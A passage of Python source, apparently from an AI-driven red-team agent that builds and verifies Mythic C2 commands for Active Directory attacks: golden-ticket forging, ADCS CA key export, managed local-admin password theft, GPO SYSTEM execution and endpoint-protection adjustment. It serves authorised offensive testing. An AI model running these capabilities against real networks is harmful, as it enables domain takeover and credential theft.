        seen: set[str] = set()
        for candidate in (
            identity,
            identity.rsplit("\\", 1)[-1] if "\\" in identity else "",
            identity.split("@", 1)[0] if "@" in identity else "",
        ):
            normalized = candidate.strip().casefold()
            if normalized and normalized not in seen:
                seen.add(normalized)
                out.append(normalized)
        return out

    def record_capability_result(self, action, probe_result, now: str | None = None, evidence: dict | None = None):
        """Record a generic capability verifier result into the engagement ledger.

        Live/probe helpers should call this after they have gathered structured
        evidence. The method is deliberately side-effect narrow: it updates Sage's
        hop ledger and persists it, but it does not issue Mythic tasks or infer
        effects from prose.
        """
        try:
            try:
                from . import capabilities, engagement_state
            except ImportError:
                import capabilities
                import engagement_state
            now = now or datetime.now(timezone.utc).isoformat()
            state = engagement_state.EngagementState(
                objective=self._engagement_objective(),
                footholds=list(getattr(self, "_engagement_footholds", []) or []),
                hops=list(getattr(self, "_engagement_hops", []) or []),
                graph_facts=list(getattr(self, "_engagement_graph_facts", []) or []),
                engagement_id=self._eng_key(),
                runtime_scope=True,
            )
            evidence = dict(evidence or {})
            action_intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
            policy_decision = action_intent.get("policy_decision")
            if isinstance(policy_decision, dict):
                for key, value in _policy_decision_evidence(policy_decision).items():
                    evidence.setdefault(key, value)
            action_name = str(getattr(action, "name", "") or "")
            transaction_id = str(
                action_intent.get("transaction_id")
                or evidence.get("transaction_id")
                or self._current_transaction_id()
                or ""
            )
            if transaction_id:
                evidence.setdefault("transaction_id", transaction_id)
            artifact_id = str(
                evidence.get("pfx_artifact_id")
                or (probe_result.get("pfx_artifact_id") if isinstance(probe_result, dict) else "")
                or ""
            )
            artifact_sha256 = str(
                evidence.get("pfx_artifact_sha256")
                or (probe_result.get("pfx_artifact_sha256") if isinstance(probe_result, dict) else "")
                or ""
            )
            if action_name.casefold() == "adcs-ca-private-key-export" and artifact_id and artifact_sha256:
                proof_envelope = self._runtime_artifact_proof_envelope(
                    f"capability:{action_name}",
                    now,
                    artifact_id=artifact_id,
                    artifact_sha256=artifact_sha256,
                    transaction_id=transaction_id,
                    metadata={"capability_target": getattr(action, "target", "")},
                )
            else:
                proof_envelope = self._runtime_task_proof_envelope(
                    f"capability:{action_name}",
                    now,
                    transaction_id=transaction_id,
                    metadata={"capability_target": getattr(action, "target", "")},
                )
            updated, verification = capabilities.record_capability_result(
                state,
                action,
                probe_result,
                now,
                evidence=evidence,
                proof_envelope=proof_envelope,
            )
            self._engagement_hops = updated.hops
            try:
                self._persist_engagement_ledger()
            except Exception:
                pass
            return verification
        except Exception as exc:
            try:
                from . import capabilities
            except ImportError:
                import capabilities
            return capabilities.CapabilityVerification("failed", f"capability record failed: {exc}")

    def _record_deterministic_capability_command_result(
        self,
        command: str,
        parameters,
        callback_display_id,
        output: str,
    ) -> None:
        try:
            context = getattr(self, "_deterministic_capability_command_contexts", {}).get(
                _capability_command_key(command, parameters),
                {},
            )
            if not context:
                return
            capability = self._capability_text(context.get("capability")).casefold()
            expected_probe = self._capability_text(context.get("expected_probe")).casefold()
            account_context_action = None
            if capability == "ensure-account-kerberos-context":
                try:
                    from . import capabilities as account_context_capabilities
                except ImportError:
                    import capabilities as account_context_capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                account_context_action = account_context_capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
            if capability == "ensure-account-kerberos-context" and expected_probe == "extract_logon_context_probe":
                account = self._capability_account(account_context_action, {})
                domain = self._capability_account_context_domain(account_context_action, {})
                low = self._capability_text(output).casefold()
                if (
                    account
                    and domain
                    and (
                        "successfully set primary identity" in low
                        or "successfully impersonated" in low
                        or "new claims" in low
                    )
                ):
                    self._kerberos_logon_account_context_keys.add(
                        self._kerberos_account_context_key(callback_display_id, account, domain)
                    )
                return
            if capability == "ensure-account-kerberos-context" and expected_probe == "extract_account_ticket_cache_probe":
                account = self._capability_account(account_context_action, {})
                domain = self._capability_account_context_domain(account_context_action, {})
                if account and domain and self._ticket_cache_output_has_account(output, account, domain):
                    self._kerberos_account_context_keys.add(
                        self._kerberos_account_context_key(callback_display_id, account, domain)
                    )
                return
            if capability == "gpo-controlled-system-exec":
                if expected_probe != "extract_gpo_system_exec_probe":
                    return
                # Structured setup artifact reads can contain `NT AUTHORITY\SYSTEM`
                # and satisfy the raw extractor, but they are not effect proof. Only
                # the transaction's final proof step may bridge into durable state.
                if not self._capability_executor_is_final_probe(context):
                    return
                try:
                    from . import capabilities
                except ImportError:
                    import capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                probe = dict(capabilities.extract_gpo_system_exec_probe(output))
                probe["callback_id"] = self._capability_text(callback_display_id)
                verification = capabilities.verify_capability(capability, probe)
                if verification.verdict != "achieved":
                    return
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
                self.record_capability_result(
                    action,
                    probe,
                    evidence={
                        "source": "deterministic_capability_command",
                        "provenance": "run",
                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                        "callback_id": callback_display_id,
                        "command": self._capability_text(command),
                    },
                )
                return
            if capability == "read-managed-local-admin-secret":
                if expected_probe != "extract_managed_local_admin_secret_probe":
                    return
                try:
                    from . import capabilities
                except ImportError:
                    import capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
                target_host = self._capability_text(
                    intent.get("target_host") or intent.get("host") or self._capability_target_host_from_context(context)
                ).casefold()
                target_domain = self._capability_text(
                    intent.get("target_domain") or intent.get("domain") or self._capability_target_domain_from_context(context)
                ).casefold()
                account = self._capability_text(intent.get("account") or intent.get("user")).casefold()
                account_domain = self._capability_text(
                    intent.get("account_domain") or intent.get("reader_domain") or intent.get("principal_domain")
                ).casefold()
                probe = dict(capabilities.extract_managed_local_admin_secret_probe(output, target_host, target_domain))
                probe["callback_id"] = self._capability_text(callback_display_id)
                if account:
                    probe["account"] = account
                if account_domain:
                    probe["account_domain"] = account_domain
                verification = capabilities.verify_capability(capability, probe)
                if verification.verdict != "achieved":
                    return
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
                self.record_capability_result(
                    action,
                    probe,
                    evidence={
                        "source": "deterministic_capability_command",
                        "provenance": "run",
                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                        "callback_id": callback_display_id,
                        "command": self._capability_text(command),
                    },
                )
                return
            if capability == "use-managed-local-admin-secret":
                if expected_probe != "extract_local_admin_access_probe":
                    return
                try:
                    from . import capabilities
                except ImportError:
                    import capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
                target_host = self._capability_text(
                    intent.get("target_host") or intent.get("host") or self._capability_target_host_from_context(context)
                ).casefold()
                target_domain = self._capability_text(
                    intent.get("target_domain") or intent.get("domain") or self._capability_target_domain_from_context(context)
                ).casefold()
                probe = dict(capabilities.extract_local_admin_access_probe(output, target_host, target_domain))
                probe["callback_id"] = self._capability_text(callback_display_id)
                verification = capabilities.verify_capability(capability, probe)
                if verification.verdict != "achieved":
                    return
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
                self.record_capability_result(
                    action,
                    probe,
                    evidence={
                        "source": "deterministic_capability_command",
                        "provenance": "run",
                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                        "callback_id": callback_display_id,
                        "command": self._capability_text(command),
                    },
                )
                return
            if capability == "execute-as-local-admin":
                if expected_probe != "extract_remote_execution_probe":
                    return
                try:
                    from . import capabilities
                except ImportError:
                    import capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
                target_host = self._capability_text(
                    intent.get("target_host")
                    or intent.get("host")
                    or runtime.get("target_host")
                    or runtime.get("host")
                    or self._capability_target_host_from_context(context)
                ).casefold()
                target_domain = self._capability_text(
                    intent.get("target_domain")
                    or intent.get("domain")
                    or runtime.get("target_domain")
                    or runtime.get("domain")
                    or self._capability_target_domain_from_context(context)
                ).casefold()
                proof_marker = self._capability_text(intent.get("proof_marker") or runtime.get("proof_marker"))
                probe = dict(capabilities.extract_remote_execution_probe(
                    output,
                    target_host,
                    target_domain,
                    proof_marker,
                ))
                probe["callback_id"] = self._capability_text(callback_display_id)
                verification = capabilities.verify_capability(capability, probe)
                if verification.verdict != "achieved":
                    return
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
                self.record_capability_result(
                    action,
                    probe,
                    evidence={
                        "source": "deterministic_capability_command",
                        "provenance": "run",
                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                        "callback_id": callback_display_id,
                        "command": self._capability_text(command),
                    },
                )
                return
            if capability == "endpoint-protection-adjustment":
                if expected_probe != "extract_endpoint_protection_probe":
                    return
                try:
                    from . import capabilities
                except ImportError:
                    import capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
                target_host = self._capability_text(
                    intent.get("target_host")
                    or intent.get("host")
                    or runtime.get("target_host")
                    or runtime.get("host")
                    or self._capability_target_host_from_context(context)
                ).casefold()
                target_domain = self._capability_text(
                    intent.get("target_domain")
                    or intent.get("domain")
                    or runtime.get("target_domain")
                    or runtime.get("domain")
                    or self._capability_target_domain_from_context(context)
                ).casefold()
                proof_marker = self._capability_text(
                    intent.get("proof_marker")
                    or intent.get("adjustment_marker")
                    or runtime.get("proof_marker")
                    or runtime.get("adjustment_marker")
                )
                probe = dict(capabilities.extract_endpoint_protection_probe(
                    output,
                    target_host,
                    target_domain,
                    proof_marker,
                ))
                probe["callback_id"] = self._capability_text(callback_display_id)
                verification = capabilities.verify_capability(capability, probe)
                if verification.verdict != "achieved":
                    return
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
                self.record_capability_result(
                    action,
                    probe,
                    evidence={
                        "source": "deterministic_capability_command",
                        "provenance": "run",
                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                        "callback_id": callback_display_id,
                        "command": self._capability_text(command),
                    },
                )
                return
            if capability == "adcs-ca-private-key-export":
                if expected_probe != "extract_adcs_ca_private_key_probe":
                    return
                try:
                    from . import capabilities
                except ImportError:
                    import capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
                target_host = self._capability_text(
                    intent.get("target_host")
                    or intent.get("host")
                    or runtime.get("target_host")
                    or runtime.get("host")
                    or self._capability_target_host_from_context(context)
                ).casefold()
                target_domain = self._capability_text(
                    intent.get("target_domain")
                    or intent.get("domain")
                    or runtime.get("target_domain")
                    or runtime.get("domain")
                    or self._capability_target_domain_from_context(context)
                ).casefold()
                proof_marker = self._capability_text(
                    intent.get("proof_marker")
                    or intent.get("export_marker")
                    or runtime.get("proof_marker")
                    or runtime.get("export_marker")
                )
                probe = dict(capabilities.extract_adcs_ca_private_key_probe(
                    output,
                    target_host,
                    target_domain,
                    proof_marker,
                ))
                probe["callback_id"] = self._capability_text(callback_display_id)
                probe.update(self._persist_adcs_ca_export_artifact(output, target_host, target_domain))
                verification = capabilities.verify_capability(capability, probe)
                if verification.verdict != "achieved":
                    return
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
                evidence = {
                    "source": "deterministic_capability_command",
                    "provenance": "run",
                    "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                    "callback_id": callback_display_id,
                    "command": self._capability_text(command),
                }
                evidence.update(self._adcs_ca_export_artifact_evidence(probe))
                self.record_capability_result(
                    action,
                    probe,
                    evidence=evidence,
                )
                return
            if capability == "adcs-esc-certificate-enroll":
                if expected_probe != "extract_adcs_enrolled_certificate_probe":
                    return
                try:
                    from . import capabilities
                except ImportError:
                    import capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
                account = self._capability_text(
                    intent.get("account")
                    or intent.get("user")
                    or runtime.get("account")
                    or runtime.get("user")
                    or "administrator"
                ).casefold()
                domain = self._capability_text(
                    intent.get("domain")
                    or intent.get("target_domain")
                    or runtime.get("domain")
                    or runtime.get("target_domain")
                    or self._capability_target_domain_from_context(context)
                ).casefold()
                proof_marker = self._capability_text(
                    intent.get("proof_marker")
                    or intent.get("enroll_marker")
                    or runtime.get("proof_marker")
                    or runtime.get("enroll_marker")
                )
                probe = dict(capabilities.extract_adcs_enrolled_certificate_probe(
                    output,
                    account,
                    domain,
                    proof_marker,
                ))
                probe["callback_id"] = self._capability_text(callback_display_id)
                verification = capabilities.verify_capability(capability, probe)
                if verification.verdict != "achieved":
                    return
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
                self.record_capability_result(
                    action,
                    probe,
                    evidence={
                        "source": "deterministic_capability_command",
                        "provenance": "run",
                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                        "callback_id": callback_display_id,
                        "command": self._capability_text(command),
                    },
                )
                return
            if capability == "adcs-certificate-auth":
                if expected_probe != "extract_adcs_certificate_auth_probe":
                    return
                try:
                    from . import capabilities
                except ImportError:
                    import capabilities
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
                account = self._capability_text(
                    intent.get("account")
                    or intent.get("user")
                    or runtime.get("account")
                    or runtime.get("user")
                    or "administrator"
                ).casefold()
                domain = self._capability_text(
                    intent.get("domain")
                    or intent.get("target_domain")
                    or runtime.get("domain")
                    or runtime.get("target_domain")
                    or self._capability_target_domain_from_context(context)
                ).casefold()
                proof_marker = self._capability_text(
                    intent.get("proof_marker")
                    or intent.get("auth_marker")
                    or runtime.get("proof_marker")
                    or runtime.get("auth_marker")
                )
                probe = dict(capabilities.extract_adcs_certificate_auth_probe(
                    output,
                    account,
                    domain,
                    proof_marker,
                ))
                probe["callback_id"] = self._capability_text(callback_display_id)
                verification = capabilities.verify_capability(capability, probe)
                if verification.verdict != "achieved":
                    return
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
                self.record_capability_result(
                    action,
                    probe,
                    evidence={
                        "source": "deterministic_capability_command",
                        "provenance": "run",
                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                        "callback_id": callback_display_id,
                        "command": self._capability_text(command),
                    },
                )
                return
            if capability not in {
                "forge-golden-ticket",
                "ensure-kerberos-context",
                "ensure-account-kerberos-context",
            }:
                return
            if expected_probe not in {"extract_ticket_probe", "extract_account_ticket_probe"}:
                return
            try:
                from . import capabilities, credential_artifacts
            except ImportError:
                import capabilities
                import credential_artifacts
            action = account_context_action
            if action is None:
                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
                action = capabilities.CapabilityAction(
                    name=self._capability_text(action_data.get("name") or capability),
                    target=self._capability_text(action_data.get("target") or context.get("target")),
                    preconditions=self._capability_list(action_data.get("preconditions")),
                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
                    reason=self._capability_text(action_data.get("reason")),
                    source_facts=self._capability_list(action_data.get("source_facts")),
                )
            probe = dict(credential_artifacts.extract_ticket_probe(output))
            probe["callback_id"] = self._capability_text(callback_display_id)
            if capability == "ensure-account-kerberos-context":
                account = self._capability_account(action, {})
                domain = self._capability_account_context_domain(action, {})
                if account:
                    probe["account"] = account
                if domain:
                    probe["domain"] = domain
                probe["account_ticket_present"] = self._kerberos_account_context_key(
                    callback_display_id,
                    account,
                    domain,
                ) in getattr(self, "_kerberos_account_context_keys", set())
                probe["logon_context_proven"] = self._kerberos_account_context_key(
                    callback_display_id,
                    account,
                    domain,
                ) in getattr(
                    self,
                    "_kerberos_logon_account_context_keys",
                    set(),
                )
            verification = capabilities.verify_capability(capability, probe)
            if verification.verdict != "achieved":
                return
            self.record_capability_result(
                action,
                probe,
                evidence={
                    "source": "deterministic_capability_command",
                    "provenance": "run",
                    "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                    "callback_id": callback_display_id,
                    "command": self._capability_text(command),
                },
            )
        except Exception as exc:
            try:
                logger.info(f"🧭 [capability-record] deterministic command record skipped: {exc}")
            except Exception:
                pass

    def build_capability_execution_plan(self, action, inputs: dict | None = None):
        """Build deterministic, payload-agnostic execution steps for a capability action."""
        try:
            try:
                from . import capabilities
            except ImportError:
                import capabilities
            return capabilities.build_capability_execution_plan(action, inputs)
        except Exception as exc:
            try:
                from . import capabilities
            except ImportError:
                import capabilities
            return capabilities.CapabilityExecutionPlan(False, missing=["builder"], reason=str(exc))

    async def build_capability_commands(
        self,
        action: Annotated[dict | str, (
            "Capability action to build. Pass either a NEXT CAPABILITY ACTION dict "
            "({name,target,intent,effects}) or a compact request such as "
            "{\"capability\":\"forge-golden-ticket\",\"domain\":\"north.example.local\"} or "
            "{\"capability\":\"ensure-kerberos-context\",\"domain\":\"root.example.local\","
            "\"source_domain\":\"child.root.example.local\",\"callback_id\":\"7\"} or "
            "{\"capability\":\"ensure-account-kerberos-context\",\"domain\":\"root.example.local\","
            "\"account\":\"alice\",\"callback_id\":\"7\"} or "
            "{\"capability\":\"read-managed-local-admin-secret\",\"account\":\"alice\","
            "\"account_domain\":\"root.example.local\",\"target_host\":\"ws01\","
            "\"target_domain\":\"child.example.local\",\"callback_id\":\"7\"} or "
            "{\"capability\":\"use-managed-local-admin-secret\",\"target_host\":\"ws01\","
            "\"target_domain\":\"child.example.local\",\"callback_id\":\"7\"} or "
            "{\"capability\":\"execute-as-local-admin\",\"target_host\":\"ws01\","
            "\"target_domain\":\"child.example.local\",\"callback_id\":\"7\"}."
        )],
        inputs: Annotated[dict | str | None, (
            "Runtime values for the capability. For ticket/context capabilities include domain_sid and either "
            "aes256/ntlm/key. If key is omitted, Sage reads Mythic credentials for krbtgt in the source "
            "domain. For SID-history, pass target_domain and let Sage resolve source/parent domain SIDs "
            "from BloodHound when possible. Explicit extra_sids or parent_domain_sid are accepted only with "
            "trusted provenance. SIDs must be numeric Windows SIDs like S-1-5-21-111-222-333 or "
            "S-1-5-21-111-222-333-519; GUID/objectId-shaped values are rejected. The builder emits a "
            "ticket-artifact forge plus isolated Kerberos context/use/proof steps; do not request /ptt. "
            "For account-context capabilities, pass account/domain/callback_id; Sage selects that account's "
            "AES/NTLM key from Mythic credentials when omitted and proves access with a callback-scoped "
            "ticket-store context. For managed-local-admin-secret reads, pass target_host/target_domain and "
            "the reader account/domain; Sage resolves a target DC when possible and emits an LDAP read that "
            "records only after plaintext managed password material is proven. For managed-local-admin-secret "
            "use, pass password/secret or ensure a matching plaintext Mythic credential exists; Sage creates "
            "an isolated NetOnly context and proves admin-share access before recording. For execute-as-local-admin, "
            "Sage reuses a matching plaintext local-admin credential from Mythic when omitted, emits bounded "
            "remote execution plus proof commands, and records only after target-side proof is returned. For "
            "gpo-controlled-system-exec, pass method='gpp-immediate-task-fallback' after SharpGPOAbuse returns a "
            "GUID-only/no-op result; Sage emits deterministic GPP XML/CSE/version repair, local gpupdate, and "
            "proof-file read commands. Also pass gpo_guid when SharpGPOAbuse printed one. For GPO SYSTEM tasks, "
            "pass command/arguments or command_path/command_arguments for the exact SYSTEM action; proof files "
            "default to C:\\Users\\Public so the low-privileged foothold can read them back. For ticket capabilities, pass proof_resource/proof_host when BloodHound "
            "cannot derive a DC. Cross-domain Kerberos use defaults to OS-native referral/service ticket "
            "acquisition after current-session import; pass kerberos_ticket_acquisition_strategy='explicit-asktgs' "
            "only when a standalone TGS artifact is required."
        )] = None,
    ) -> str:
        """Build deterministic Mythic command parameters for a generic capability action.

        This tool does NOT execute anything. It converts the rendered capability action plus runtime
        inputs into exact Mythic command/parameter objects. For ticket forges, use this tool first, issue the
        returned non-deferred forge command with ``issue_task_and_waitfor_task_output``, bind produced artifacts
        to any deferred context/import steps, and verify access before recording achievement. Prompt-built
        Kerberos forge commands are blocked by the engagement gate.
        """
        try:
            try:
                from . import capabilities
                from . import mythic_capability_adapter
            except ImportError:
                import capabilities
                import mythic_capability_adapter

            input_values = self._capability_tool_inputs(inputs)
            action_obj = self._capability_tool_action(action, input_values, capabilities)
            if action_obj is None:
                return json.dumps({
                    "ok": False,
                    "missing": ["action"],
                    "reason": "build_capability_commands needs a capability action name/domain or action dict",
                    "commands": [],
                }, sort_keys=True)

            await self._augment_capability_runtime_inputs(action_obj, input_values)
            await self._bind_capability_mythic_adapter(action_obj, input_values)
            self._validate_capability_ticket_sid_sources(action_obj, input_values)
            input_errors = self._capability_input_errors(input_values)
            if input_errors:
                return json.dumps({
                    "ok": False,
                    "missing": input_errors,
                    "reason": (
                        "invalid capability runtime input(s); resolve numeric domain SIDs from a trusted "
                        "directory/BloodHound source before building a ticket command"
                    ),
                    "action": asdict(action_obj) if is_dataclass(action_obj) else str(action_obj),
                    "commands": [],
                }, sort_keys=True)
            execution_plan = capabilities.build_capability_execution_plan(action_obj, input_values)
            adapter_config = input_values.get("mythic_adapter") if isinstance(input_values.get("mythic_adapter"), dict) else input_values
            command_plan = mythic_capability_adapter.build_mythic_capability_commands(execution_plan, adapter_config)
            for command_obj in list(getattr(command_plan, "commands", []) or []):
                command_name = self._capability_text(getattr(command_obj, "command", ""))
                command_params = getattr(command_obj, "parameters", {})
                command_context = {
                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                    "target": self._capability_text(getattr(action_obj, "target", "")),
                    "effects": list(getattr(action_obj, "effects", []) or []),
                    "intent": dict(getattr(action_obj, "intent", {}) or {}),
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "runtime_inputs": self._safe_capability_runtime_context(input_values),
                    "operation": self._capability_text(getattr(command_obj, "operation", "")),
                    "purpose": self._capability_text(getattr(command_obj, "purpose", "")),
                    "expected_probe": self._capability_text(getattr(command_obj, "expected_probe", "")),
                    "produces": list(getattr(command_obj, "produces", []) or []),
                    "consumes": list(getattr(command_obj, "consumes", []) or []),
                    "policy_decision": (
                        dict(input_values.get("policy_decision"))
                        if isinstance(input_values.get("policy_decision"), dict)
                        else dict((getattr(action_obj, "intent", {}) or {}).get("policy_decision") or {})
                    ),
                    "transaction_id": self._capability_text(
                        input_values.get("transaction_id")
                        or (getattr(action_obj, "intent", {}) or {}).get("transaction_id")
                    ),
                }
                self._deterministic_capability_command_contexts[
                    _capability_command_key(command_name, command_params)
                ] = command_context
                key = _ticket_command_key(
                    command_name,
                    command_params,
                )
                if key:
                    self._deterministic_ticket_command_keys.add(key)
                    self._deterministic_ticket_command_contexts[key] = command_context
            return json.dumps(
                self._capability_command_plan_payload(action_obj, execution_plan, command_plan),
                sort_keys=True,
            )
        except Exception as exc:
            return json.dumps({
                "ok": False,
                "missing": ["builder"],
                "reason": str(exc),
                "commands": [],
            }, sort_keys=True)

    def _capability_tool_inputs(self, inputs) -> dict:
        value = self._capability_json_value(inputs)
        if isinstance(value, dict):
            out = dict(value)
        elif value in (None, ""):
            out = {}
        else:
            out = {"value": value}
        self._normalize_capability_ticket_inputs(out)
        return out

    async def _bind_capability_mythic_adapter(self, action, inputs: dict) -> None:
        """Attach a payload-type command profile unless the caller supplied one."""
        if not isinstance(inputs, dict) or "mythic_adapter" in inputs:
            return
        callback_id = self._capability_callback_id(action, inputs)
        if not callback_id or not callback_id.isdigit():
            return
        try:
            payload_type = await self._resolve_payload_type(int(callback_id))
            try:
                from . import mythic_capability_adapter
            except ImportError:
                import mythic_capability_adapter
            profile = mythic_capability_adapter.adapter_config_for_payload_type(payload_type)
            if profile:
                # Without a payload profile, callers already pass runtime adapter overrides
                # at the top level. Preserve that precedence when auto-binding a profile.
                merged_profile = dict(profile)
                merged_profile.update({
                    key: value
                    for key, value in inputs.items()
                    if key != "mythic_adapter"
                })
                inputs["mythic_adapter"] = merged_profile
        except Exception:
            return

    def _safe_capability_runtime_context(self, inputs: dict) -> dict:
        if not isinstance(inputs, dict):
            return {}
        secret_keys = {
            "password",
            "local_admin_password",
            "managed_local_admin_secret",
            "secret",
            "credential",
            "credential_text",
            "key",
            "krbtgt_key",
            "krbtgt_hash",
            "aes256",
            "aes128",
            "rc4",
            "ntlm",
            "nthash",
            "pfx_password",
            "certificate_password",
            "ca_pfx_password",
            "ca_cert_password",
            "ca_certificate_password",
            "forged_pfx_password",
            "forged_certificate_password",
            "new_cert_password",
            "certificate_base64",
        }
        out = {}
        for key, value in inputs.items():
            normalized = self._capability_text(key).casefold()
            if normalized in secret_keys or normalized.startswith("_"):
                continue
            if isinstance(value, (str, int, float, bool, list, tuple)):
                out[key] = value
        return out

    def _capability_tool_action(self, action, inputs: dict, capabilities_mod):
        if isinstance(action, capabilities_mod.CapabilityAction):
            return action

        value = self._capability_json_value(action)
        if isinstance(value, str):
            data = {"name": value}
        elif isinstance(value, dict):
            data = dict(value)
        else:
            return None

        intent = self._capability_json_value(data.get("intent"))
